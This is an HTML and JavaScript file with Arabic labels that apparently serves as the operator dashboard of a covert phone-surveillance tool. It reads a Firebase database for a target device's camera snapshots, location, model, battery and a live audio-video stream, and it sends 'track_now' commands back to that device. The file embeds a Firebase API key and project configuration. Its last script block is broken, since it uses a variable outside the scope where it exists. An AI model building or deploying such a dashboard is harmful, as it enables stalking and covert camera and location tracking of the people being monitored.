<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>لوحة التحكم الاحترافية - Live</title>
    <style>
        :root { 
            --bg: #0f172a; 
            --card: #1e293b; 
            --text: #e2e8f0; 
            --accent: #3b82f6; 
            --danger: #ef4444; 
            --success: #22c55e; 
            --border: #334155;
        }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background-color: var(--bg); 
            color: var(--text); 
            margin: 0; 
            padding: 20px; 
        }

        .grid-container { 
            display: grid; 
            grid-template-columns: 2fr 1fr; 
            gap: 20px; 
            height: calc(100vh - 40px); 
        }

        /* Video Section */
        .video-section { 
            background: #000; 
            border-radius: 12px; 
            overflow: hidden; 
            position: relative; 
            border: 1px solid var(--border);
            box-shadow: 0 4px 6px rgba(0,0,0,0.5);
        }
        #liveVideo { 
            width: 100%; 
            height: 100%; 
            object-fit: cover; 
            transform: scaleX(-1); /* Mirror effect */
        }
        .live-badge { 
            position: absolute; 
            top: 10px; 
            left: 10px; 
            background: red; 
            color: white; 
            padding: 2px 8px; 
            border-radius: 4px; 
            font-size: 12px; 
            font-weight: bold; 
            animation: pulse 1.5s infinite; 
        }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }

        .capture-btn {
            position: absolute;
            bottom: 15px;
            right: 15px;
            background: rgba(255, 255, 255, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.4);
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            cursor: pointer;
            backdrop-filter: blur(5px);
            transition: all 0.2s;
        }
        .capture-btn:hover {
            background: var(--accent);
            border-color: var(--accent);
        }

        .info-panel { 
            display: flex; 
            flex-direction: column; 
            gap: 15px; 
            overflow-y: auto; 
        }
        .card { 
            background: var(--card); 
            padding: 15px; 
            border-radius: 12px; 
            box-shadow: 0 4px 6px rgba(0,0,0,0.3); 
            border: 1px solid var(--border);
        }
        .card h3 { 
            margin-top: 0; 
            color: var(--accent); 
            border-bottom: 1px solid var(--border); 
            padding-bottom: 10px; 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
        }

        .device-info p { 
            margin: 8px 0; 
            font-size: 0.9em; 
            display: flex; 
            justify-content: space-between; 
            border-bottom: 1px solid #33415555; 
            padding-bottom: 4px; 
        }
        .device-info span { color: #94a3b8; }
        .device-info strong { color: #fff; }

        .gallery { 
            display: grid; 
            grid-template-columns: repeat(auto-fill, minmax(80px, 1fr)); 
            gap: 10px; 
            max-height: 300px; 
            overflow-y: auto; 
        }
        .gallery-item { 
            position: relative; 
            cursor: pointer; 
            border-radius: 8px; 
            overflow: hidden; 
            border: 1px solid var(--border);
        }
        .gallery img { 
            width: 100%; 
            height: 80px; 
            object-fit: cover; 
            transition: transform 0.2s; 
        }
        .gallery img:hover { transform: scale(1.1); }
        .delete-btn { 
            position: absolute; 
            top: 2px; 
            right: 2px; 
            background: rgba(239, 68, 68, 0.9); 
            color: white; 
            border: none; 
            border-radius: 50%; 
            width: 20px; 
            height: 20px; 
            font-size: 12px; 
            cursor: pointer; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            z-index: 10; 
        }

        .full-screen-img { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.9); 
            z-index: 1000; 
            display: none; 
            justify-content: center; 
            align-items: center; 
        }
        .full-screen-img img { 
            max-width: 90%; 
            max-height: 90%; 
            border-radius: 10px; 
        }
        .close-btn { 
            position: absolute; 
            top: 20px; 
            right: 20px; 
            color: white; 
            font-size: 30px; 
            cursor: pointer; 
        }

        button.track-btn { 
            background: var(--accent); 
            color: white; 
            border: none; 
            padding: 10px 20px; 
            border-radius: 8px; 
            cursor: pointer; 
            width: 100%; 
            margin-top: 10px; 
            font-weight: bold; 
        }
        button.track-btn:hover { background: #2563eb; }
        
        /* Scrollbar */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: var(--bg); }
        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
    </style>
</head>
<body>

    <div class="grid-container">
        <!-- قسم الفيديو المباشر -->
        <div class="video-section">
            <div class="live-badge">● LIVE</div>
            <video id="liveVideo" autoplay playsinline muted></video>
            <button class="capture-btn" onclick="takeScreenshotFromLive()">📸 التقاط صورة</button>
        </div>

        <!-- قسم المعلومات والصور -->
        <div class="info-panel">

            <!-- بطاقة معلومات الجهاز -->
            <div class="card device-info">
                <h3>📱 بيانات الجهاز <span style="font-size:0.8em; color:#aaa" id="last-update">--</span></h3>
                <p><span>النوع:</span> <strong id="dev-model">جاري الكشف...</strong></p>
                <p><span>المتصفح:</span> <strong id="dev-browser">--</strong></p>
                <p><span>الشبكة:</span> <strong id="dev-net">--</strong></p>
                <p><span>البطارية:</span> <strong id="dev-battery">--</strong>%</p>
                <button class="track-btn" onclick="sendTrackCommand()">📡 تحديث فوري</button>
            </div>

            <!-- معرض الصور -->
            <div class="card">
                <h3>📷 سجل الكاميرا <span style="font-size:0.8em; color:#aaa">اضغط للحذف</span></h3>
                <div class="gallery" id="photoGallery"></div>
            </div>
            <div class="card">
                <h3>🎥 البث المباشر (صوت وصورة)</h3>
                <!-- هنا سنعرض آخر مقطع فيديو تم استقباله -->
                <video id="livePlayer" controls autoplay muted style="width:100%; border-radius:10px; background:#000;"></video>
            </div>
        </div>
    </div>

    <!-- نافذة عرض الصورة الكاملة -->
    <div class="full-screen-img" id="fsModal" onclick="this.style.display='none'">
        <span class="close-btn">&times;</span>
        <img id="fsImage" src="">
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, onValue, push, set, remove } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyClLKG-kiVCBcltXCBUsF6BjzlZB7KS2N8",
            authDomain: "secret-a6854.firebaseapp.com",
            databaseURL: "https://secret-a6854-default-rtdb.firebaseio.com",
            projectId: "secret-a6854",
            storageBucket: "secret-a6854.firebasestorage.app",
            messagingSenderId: "250063667423",
            appId: "1:250063667423:web:68038e2a9c8f491be9296a"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const liveVideo = document.getElementById('liveVideo');
        const gallery = document.getElementById('photoGallery');
        const fsModal = document.getElementById('fsModal');
        const fsImage = document.getElementById('fsImage');

        // تحليل بيانات الجهاز محلياً للعرض السريع
        function updateLocalDeviceInfo() {
            const ua = navigator.userAgent;
            let model = "PC";
            if (/iPhone|iPad/.test(ua)) model = "Apple iOS";
            else if (/Android/.test(ua)) model = "Android Device";
            
            let browser = "Unknown";
            if (/Chrome/.test(ua)) browser = "Chrome";
            else if (/Firefox/.test(ua)) browser = "Firefox";
            else if (/Safari/.test(ua)) browser = "Safari";

            document.getElementById('dev-model').innerText = model;
            document.getElementById('dev-browser').innerText = browser;
            document.getElementById('dev-net').innerText = navigator.onLine ? "Connected" : "Offline";

            // Battery API
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    document.getElementById('dev-battery').innerText = Math.round(battery.level * 100);
                });
            } else {
                document.getElementById('dev-battery').innerText = "N/A";
            }
        }

        setInterval(updateLocalDeviceInfo, 5000);

        // الاستماع للبيانات
        onValue(ref(db, 'users'), (snapshot) => {
            const data = snapshot.val();
            if (!data) return;

            const entries = Object.entries(data).sort((a, b) => new Date(b[1].time) - new Date(a[1].time));

            // 1. معالجة الموقع والجهاز
            const latestLoc = entries.find(e => e[1].type === 'location');
            if (latestLoc) {
                const lat = latestLoc[1].lat;
                const lng = latestLoc[1].lng;
                
                if(latestLoc[1].deviceInfo) {
                    document.getElementById('dev-model').innerText = latestLoc[1].deviceInfo.model || 'Unknown';
                    document.getElementById('dev-browser').innerText = latestLoc[1].deviceInfo.browser || 'Unknown';
                    document.getElementById('dev-net').innerText = latestLoc[1].connection || 'Unknown';
                    document.getElementById('dev-battery').innerText = latestLoc[1].battery ? Math.round(latestLoc[1].battery * 100) + '%' : '--';
                    document.getElementById('last-update').innerText = new Date(latestLoc[1].time).toLocaleTimeString();
                }
            }

            // 2. تحديث الصور مع زر الحذف
            const snaps = entries.filter(e => e[1].type === 'camera_snap');
            gallery.innerHTML = '';
            snaps.forEach(snap => {
                const itemDiv = document.createElement('div');
                itemDiv.className = 'gallery-item';
                
                const img = document.createElement('img');
                img.src = snap[1].data;
                img.onclick = () => {
                    fsImage.src = snap[1].data;
                    fsModal.style.display = 'flex';
                };

                const delBtn = document.createElement('button');
                delBtn.className = 'delete-btn';
                delBtn.innerHTML = '×';
                delBtn.onclick = (e) => {
                    e.stopPropagation();
                    remove(ref(db, 'users/' + snap[0]));
                };

                itemDiv.appendChild(img);
                itemDiv.appendChild(delBtn);
                gallery.appendChild(itemDiv);
            });
        });

        window.sendTrackCommand = async () => {
            alert("تم إرسال الأمر!");
            const pushRef = push(ref(db, 'commands'));
            set(pushRef, { timestamp: Date.now(), action: 'track_now' });
        };

        // دالة التقاط صورة من الفيديو المباشر
        window.takeScreenshotFromLive = () => {
            const video = liveVideo;
            if (!video.srcObject && !video.currentSrc) {
                alert("لا يوجد بث مباشر متصل حالياً.");
                return;
            }

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            // Flip horizontally to match mirror view
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageBase64 = canvas.toDataURL('image/jpeg', 0.9);
            
            // Send to Firebase
            push(ref(db, 'users'), {
                type: 'camera_snap',
                data: imageBase64,
                time: new Date().toISOString()
            });
            
            alert("تم التقاط الصورة وإرسالها!");
        };
    </script>
    <script>
        // ... داخل دالة الاستماع للبيانات onValue ...
        
        // استبدال كود Gallery القديم بهذا الجزء للفيديو:
        const videos = entries.filter(e => e[1].type === 'video_stream');
        if(videos.length > 0) {
            const latestVideo = videos[0][1]; // أحدث فيديو
            const player = document.getElementById('livePlayer');
            
            // تحويل البيانات النصية إلى Blob وتشغيلها
            const byteString = atob(latestVideo.data.split(',')[1]);
            const mimeString = latestVideo.data.split(',')[0].split(':')[1].split(';')[1];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            const blob = new Blob([ab], { type: mimeString });
            player.src = URL.createObjectURL(blob);
            player.play();
        }
    </script>
</body>
</html>
